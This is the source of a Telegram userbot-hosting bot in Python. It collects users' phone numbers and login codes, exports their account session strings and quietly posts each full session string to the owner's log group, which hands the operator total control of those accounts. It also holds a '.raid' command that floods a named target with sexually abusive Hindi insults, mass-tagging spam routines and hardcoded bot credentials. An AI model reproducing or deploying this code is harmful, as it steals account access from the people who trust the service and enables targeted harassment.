import os
import asyncio
import random
import json
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8709782891:AAEZPLJQOOJ6b-9WEMXsYWJSNu2YUu14fbI"
LOG_GROUP = -1003867805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

# OWNER DETAILS
OWNER_ID = 8724182918
OWNER_USERNAME = "@CoderNova"

SESSION_FILE = "sessions.json"

# Local Storage (Bypassing MongoDB Network/IP Whitelist Failures)
def load_local_sessions():
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_local_session(user_id, session_str):
    data = load_local_sessions()
    data[str(user_id)] = session_str
    with open(SESSION_FILE, "w") as f:
        json.dump(data, f, indent=4)

def remove_local_session(user_id):
    data = load_local_sessions()
    if str(user_id) in data:
        del data[str(user_id)]
        with open(SESSION_FILE, "w") as f:
            json.dump(data, f, indent=4)

# --- WEB SERVER FOR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "xᴇɴᴏ Bᴏᴛ Is Oɴʟɪɴᴇ! ✨"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}
running_ubots = {}

# --- BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

# --- ONETAG CHAT EXPANDED (ALAG ALAG LINES ME) ---
DAILY_CHATS = [
    "Kya kr rhe ho {mention}\nBatao jaldi",
    "Kaise ho {mention}\nSab theek thak h na?",
    "Radhe radhe {mention}\nAur kya chal raha hai?",
    "Jay shree ram {mention}\nOnline aao yaar",
    "Or ghar pe kaise h {mention}\nSab badhiya h na?",
    "Khana khaye {mention}\nKya khaya aaj?",
    "Aur batao kya chal raha hai {mention}\nKahan busy ho?",
    "Kahan busy ho aajkal {mention}\nMessage bhi nahi karte",
    "Online aao jaldi {mention}\nKaam h aapse",
    "Kuch kaam tha tumse {mention}\nFree ho kya?",
    "Hello brother kaise ho {mention}\nBohot din baad dikhe",
    "Kya chal raha hai bhai {mention}\nKuch naya batao",
    "Ghar me sab theek thak h na {mention}\nKaha ho abhi?",
    "Khana khana kha liya tumne {mention}\nTime ho gaya h",
    "Milte hain thodi der me {mention}\nTaiyar rehna",
    "Suno ek baar idhar aao {mention}\nZaroori baat h",
    "Free ho to message karo {mention}\nWait kar raha hu",
    "Aapka kya haal chal hai {mention}\nMiss kar raha tha",
    "Kuch naya batao yaar {mention}\nBoring lag raha h",
    "Jaldi se reply do {mention}\nKahan chale gye?",
    "Kahan chale gaye bina bataye {mention}\nGalat baat h",
    "Bahut dino baad dikhe {mention}\nKahan rehte ho?",
    "Aapki yaad aa rahi thi {mention}\nSach me yaar",
    "Sab badhiya chal raha h na {mention}\nKoi problem?",
    "Chalo baad me baat karte hain {mention}\nBye abhi",
    "Kahan par ho abhi aap {mention}\nLocation bhejo",
    "Mera ek kaam kar do {mention}\nPlease bhai",
    "Sote hi rehte ho kya hamesha {mention}\nJaago jaldi",
    "Kya chal raha h aajkal {mention}\nSab shanti kyun h?",
    "Aapki tabiyat kaisi h abhi {mention}\nTake care",
    "Bhai ek help chahiye thi {mention}\nKar doge na?",
    "Chalo milkar baat karte hain {mention}\nGroup me aao",
    "Call karo jab free ho jao {mention}\nImportant h",
    "Aapka din kaisa raha aaj ka {mention}\nBatao na",
    "Baki sab sahi chal raha hai na {mention}\nKoi shak?",
    "Aapne reply nahi diya abhi tak {mention}\nNaraz ho?",
    "Main abhi thoda busy hoon {mention}\nBaad me aata hu",
    "Chalo koi baat nahi fir {mention}\nTake it easy",
    "Aap bahut acche ho yaar {mention}\nDil ke saaf ho",
    "Free ho gaye kya aap {mention}\nAb toh reply do",
    "Idhar aao thoda kaam hai {mention}\nJaldi se",
    "Good morning kaise ho {mention}\nDin accha rahe aapka",
    "Good night so jao ab {mention}\nSapno me milte hain",
    "Aapki yaad aa rahi thi bahut {mention}\nKya karein ab",
    "Sab theek h na wahan par {mention}\nKoi dikkat toh nhi?",
    "Main abhi aaya bas thodi der me {mention}\nWait krna",
    "Kya kar rahe the itni der se {mention}\nKiske sath the?",
    "Kuch bolo chup kyun ho {mention}\nBolo bolo",
    "Aap kahan se ho vaise {mention}\nState batana",
    "Chalo kal baat karte hain ab {mention}\nNeend aa rhi h"
]

# --- RAID ABUSE LINES EXPANDED (ALAG ALAG LINES ME MULTILINE SPAMMING) ---
ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target\nᴋᴀ ʟᴀɴᴅ ɢʜᴜsᴀ ᴅᴜɴɢᴀ ᴘᴜʀᴀ 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target\nʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ ʟᴇᴛᴇ! 🔥",
    "ᴍᴀᴀ ᴄʜᴜᴅᴀ ᴀᴘɴɪ @target\nʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ 😂",
    "ᴛᴇʀɪ ʙᴇʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴀʀᴏ\nsᴀsᴛᴇ sʜᴀʏᴀʀ @target 🙌",
    "ɢᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ ᴀᴜʀ\nʙᴀᴀᴛᴇɪɴ ʙᴀᴅɪ ʙᴀᴅɪ @target ᴀᴀᴊᴀ ᴍᴀɪᴅᴀɴ ᴍᴇ",
    "ᴛᴇʀɪ ᴍᴀᴍᴍʏ ᴋɪ sᴀʀᴇᴇ ᴋʜᴏʟᴜ @target\nʙʜᴇᴊ ᴀᴘɴɪ ʙᴇʜᴇɴ ᴋᴏ ᴍᴇʀᴇ ᴘᴀᴀs",
    "ᴋʜᴀɴᴅᴀɴ ᴄʜᴏᴅ ᴅᴜɴɢᴀ ᴛᴇʀᴀ @target\nᴊᴀ sᴀᴅᴀᴋ sᴇ ᴀᴘɴɪ ᴍᴀᴀ ᴜᴛʜᴀ ᴋᴇ ʟᴀᴀ",
    "ʙᴇɢɢᴀʀ @target\nᴘᴀᴘᴀ sᴇ ʀᴀɪᴅ ʟᴇɢᴀ ᴛᴜ\nᴛᴇʀɪ ᴀᴜᴋᴀᴛ ɴᴀʜɪ ʜᴀɪ",
    "🔥 sᴍᴀsʜ ᴋᴀʀᴅᴜɴɢᴀ ᴛᴇʀɪ ɢᴀɴᴅ @target\nᴊᴀ ʀᴏ ᴀᴘɴɪ ᴍᴀᴀ ᴋᴇ ᴀᴀᴄʜᴀʟ ᴍᴇ",
    "ʀᴀɴᴅɪ ᴋᴇ ᴊᴀɴᴇ @target\nᴊɪᴛɴᴀ ʙʜᴀɢɴᴀ ʜᴀɪ ʙʜᴀɢ\nᴀᴀᴊ ᴛᴇʀɪ ᴍᴀᴀ ᴄʜᴜᴅᴇɢɪ"
]

# --- USERBOT COMMAND FUNCTIONS ---
async def alive_cmd(c, m): await m.edit_text("✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨")

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sᴀʙ?"
    await m.delete()
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'User'}](tg://user?id={member.user.id})"
                await c.send_message(m.chat.id, f"{input_text}\n{mention}")
                await asyncio.sleep(3.5)
            except Exception: pass
    except Exception: pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    await m.delete()
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'User'}](tg://user?id={member.user.id})"
                msg = random.choice(DAILY_CHATS).format(mention=mention)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(4.0)
            except Exception: pass
    except Exception: pass

async def raid_cmd(c, m):
    uid = c.me.id
    args = m.text.split()
    if len(args) < 3: return await m.edit_text("❌ **Usage:** `.raid 5 @username`")
    active_tasks[uid] = True 
    try:
        count, target = int(args[1]), args[2]
        await m.delete()
        for _ in range(count):
            if not active_tasks.get(uid): break 
            try:
                msg = random.choice(ABUSE_RAIDS).replace("@target", target)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(2.5) 
            except Exception: pass
    except Exception: pass

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False 
    await m.edit_text("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")

def register_ubot_handlers(ubot):
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))

# --- BOT MAIN COMMANDS ---
@bot.on_message(filters.command("start") & filters.private)
async def start_handler(c, m):
    await m.reply_photo(photo=START_IMG, caption=f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\nʜᴇʏ {m.from_user.mention}, /add sᴇ sᴛᴀʀᴛ ᴋᴀʀᴇɪɴ.", reply_markup=main_buttons)

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ (e.g. +91XXXXXXXXXX):**")

@bot.on_message(filters.command("remove") & filters.private)
async def owner_remove_panel(c, m):
    if m.from_user.id != OWNER_ID:
        uid = m.from_user.id
        if uid in running_ubots:
            try:
                await running_ubots[uid].stop()
                del running_ubots[uid]
                remove_local_session(uid)
                return await m.reply_text("✅ **ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ʜᴀs ʙᴇᴇɴ sᴛᴏᴘᴘᴇᴅ!**")
            except Exception as e: return await m.reply_text(f"❌ **Error:** `{e}`")
        return await m.reply_text("❓ **ᴀᴀᴘᴋᴀ ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ʙᴏᴛ ɴᴀʜɪ ᴍɪʟᴀ.**")

    saved_sessions = load_local_sessions()
    if not saved_sessions:
        return await m.reply_text("😔 **No active sessions found in storage!**")
    
    keyboard = []
    for u_id in saved_sessions.keys():
        status = "🟢" if int(u_id) in running_ubots else "🔴"
        keyboard.append([InlineKeyboardButton(f"{status} User ID: {u_id}", callback_data=f"info_{u_id}")])
        keyboard.append([InlineKeyboardButton("🗑️ Remove Account", callback_data=f"rem_{u_id}")])
    keyboard.append([InlineKeyboardButton("❌ Close Panel", callback_data="close")])
    await m.reply_text("🛠️ **Owner Control Panel:**", reply_markup=InlineKeyboardMarkup(keyboard))

@bot.on_callback_query()
async def handle_callbacks(c, q):
    if q.data == "close": await q.message.delete()

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ʟɪᴋᴇ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **2FA ᴘᴀssᴡᴏʀᴅ sᴇɴᴅ ᴋᴀʀᴇɪɴ.**")
        except Exception as e: await m.reply_text(f"❌ `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    
    save_local_session(uid, string)
    
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    register_ubot_handlers(ubot)
    await ubot.start()
    running_ubots[uid] = ubot
    await m.reply_text("✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ! Saved locally.**")
    try:
        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ:** `{uid}`\n`{string}`")
    except Exception: pass
    del user_data[uid]

# --- MAIN ASYNC BOOTSTRAPPER ---
async def main():
    print("[INFO] Launching main Pyrogram Bot client...")
    await bot.start()
    print("[SUCCESS] Xeno Bot is now officially ONLINE and listening!")
    
    saved_sessions = load_local_sessions()
    for u_id, string in saved_sessions.items():
        try:
            ubot = Client(f"ubot_{u_id}", API_ID, API_HASH, session_string=string)
            register_ubot_handlers(ubot)
            await ubot.start()
            running_ubots[int(u_id)] = ubot
            print(f"[SUCCESS] Auto-loaded userbot for: {u_id}")
        except Exception: pass
            
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print("[INFO] Bot Stopped.")
